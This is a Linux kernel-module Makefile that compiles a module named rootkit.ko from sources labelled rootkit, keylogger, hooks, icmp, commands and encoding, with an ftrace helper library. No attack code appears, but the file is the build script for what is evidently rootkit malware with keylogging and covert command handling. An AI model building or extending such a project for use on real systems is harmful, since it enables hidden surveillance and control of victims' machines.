KERNELDIR:=/lib/modules/$(shell uname -r)/build
EXTRA_CFLAGS := -I$(src)/inc -I$(src)/lib/inc

SOURCES = src/*.c
OBJECTS = src/main.o src/icmp.o src/rootkit.o src/commands.o src/keylogger.o src/hooks.o src/drivers.o src/encoding.o
OBJECTS += lib/src/ftrace_helper.o
obj-m = rootkit.o
rootkit-objs = $(OBJECTS)

all: rootkit.ko

rootkit.ko: $(SOURCES) lib/src/ftrace_helper.c
	make -C $(KERNELDIR) M=$(PWD) modules

clean:
	make -C $(KERNELDIR) M=$(PWD) clean